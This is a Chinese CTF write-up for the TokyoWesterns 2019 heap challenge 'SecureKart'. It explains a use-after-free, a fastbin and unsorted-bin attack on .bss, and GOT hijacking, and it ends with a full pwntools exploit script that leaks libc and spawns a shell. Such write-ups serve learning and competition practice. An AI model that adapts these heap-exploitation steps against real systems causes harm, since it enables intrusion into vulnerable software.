---
title: 'TokyoWesterns_2019:SecureKart'
date: 2019-09-03 12:06:50
tags: heap 
layout: default
---
SecureKart
<!--more-->
# prelogue
Thank @peanuts for the main part.
# analysis
```s
[*] '/home/n132/Desktop/SecureKart/karte'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
# vulnerablity
没有开PIE和全RELRO
漏洞点
* 半个UAF
* modify时没有检测inuse

利用限制:
1. 只有三个chunk ptr
2. UAF只有modify的时候能用一次 free时检测inuse
3. add中 size>0x800的时候用calloc 其他时候用malloc

比赛的时候全靠@peanuts师傅完成了改掉了lock的操作我当时照着流程复现了一遍
后面的内容其实相比前面的巧妙来说只是皮毛.
[attachmen][1]
# solution
本节是我赛后删掉exp复现时的思路
第一个遇到的问题因为`tcache size`范围中用的是`calloc`是不能直接做`tache hijacking`的
所以要弄到`fastbin`上搞方法也很简单
```python
for x in range(7):
    free(add(0x68))
```
这样就会填满tacache

之后利用`uaf`+`modify`来完成`fastbin_atk`

然后就要想要控制哪里.
本题没有开全RELRO和PIE所以首选bss段上那些重要的数据(全局变量 got表)

因为我们唯一的一次攻击机会被我们使用了要么一次成功（连地址都没有泄漏 还有fastbin-atk还是有head限制的所以不太可能)要么扩大利用.

如果是要泄漏的话在没有开`full RELRO`和`PIE`的情况下显然劫持某些`got`为`puts`比`io_leak`简单.

因为前者在本题环境下需要做`unsortedbin-atk`后者因为只有三个chunk_ptr且没办法利用name区域的edit来控制stdout,换言之就是他们都需要`unsortedbin-atk`但是前者在做了`unsortedbin-atk`之后更加方便.

所以咱的之后大致思路就有了:`unsortedbin-atk`创造一个`0x7f`的`chunk-head`在`bss`上之后控制bss上一些关键值:
* lock的值（可以扩大利用导致无限modify） 
* list的指针（配合低一点 可以任意地址写）

如果达到上述两项那么就可以为所欲为了.

于是我们细化一下流程:
首先是fastbin-atk是有head的需求所以直接来是比较难找到的
我们可以控制`name`区域次数不限 所以其上可以伪造`chunk`（一个限制是控制区域只有0x30）

我们最后要做0x71的`fastbin-atk`就需要至少`0x70+1`字节的可控制区域所以我们要控制name区域后的内容
因为0x80依然是fastbin内的所以我们可以第一次做`fastbin-atk`时使用0x80的大小先在后面的放点以后我们需要的东西.


那么我们继续要做的事情是创造一个可以控制的`unsortedbin`那这显然就是`name`区域了

之后因为name可以任意edit我们更改`fake-chunk`的`head`free到其他的`fastbin`中
利用`malloc_consolidate`使其进入`unsortedbin`（具体详见大哥的博客:[chltql][0]）

这样之后的事情就很常规了控制lock+指针任意地址写 造成`leak + got_hijacking`

# exp
```python
from pwn import *
def cmd(c):
	p.sendlineafter("> ",str(c))
def add(size,c="A"):
	cmd(1)
	cmd(size)
	p.sendafter("> ",c)
	p.readuntil("id ")
	return int(p.readline(),10)
def free(idx):
	cmd(3)
	cmd(idx)
def edit(idx,c):
	cmd(4)
	cmd(idx)
	p.sendafter("> ",c)
def do_name(name):
	p.sendafter(".. ",name)
def rename(name):
	cmd(99)
	do_name(name)
	
context.log_level='debug'
context.arch='amd64'
address=0x0000000006021A0
p=process('./karte')
#p=remote("karte.chal.ctf.westerns.tokyo",10001)
do_name("It's n132!")
for x in range(7):
	tmp=add(0x18)#0
	free(tmp)
for x in range(7):
	tmp=add(0x68)#0
	free(tmp)
for x in range(7):
	tmp=add(0x78)#0
	free(tmp)
t1=add(0x78)
t2=add(0x78)
free(t2)
free(t1)
edit(t1,p64(address)[:3])
rename(flat(0,0x81))
t1=add(0x78)
t2=add(0x78,p64(0x21)*13+p64(0x21))
rename(p64(0x21)*2)
t3=add(0x410)
free(t2)
free(t3)
rename(flat(0,0x21,0,0x602118-5-0x10))
free(t1)
t1=add(0x18)
rename(flat(0,0x71))
free(t1)
rename(flat(0,0x71,0x602110))
add(0x68)
pay=p64(0x0000000400000041)+'\x00'*0x18
pay+=p64(0x13200000001)+p64(0x000000000602018)
pay+=p64(0)*2+p64(0x13300000001)+p64(0x000000000602078)
pay+=p64(0x0000deadc0bebeef)
add(0x68,pay)
edit(0x132,p64(0x000000000400710)[:6])
free(0x133)
base=u64(p.readline()[:-1].ljust(0x8,'\x00'))-(0x7ffff7a24680-0x7ffff79e4000)
log.warning(hex(base))
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
edit(0x133,p64(libc.sym['system']+base)[:6])
cmd("/bin/sh")
p.interactive()
```

# epilogue

1. 质量挺高的一题
2. 挺考验利用的,一步步抽丝剥茧.





[0]: https://ch4r1l3.github.io/2019/01/22/malloc-consolidate%E8%B0%83%E7%94%A8%E6%9D%A1%E4%BB%B6/
[1]: https://github.com/n132/WriteUps/tree/master/2019_TokyoWesterns/SecureKart
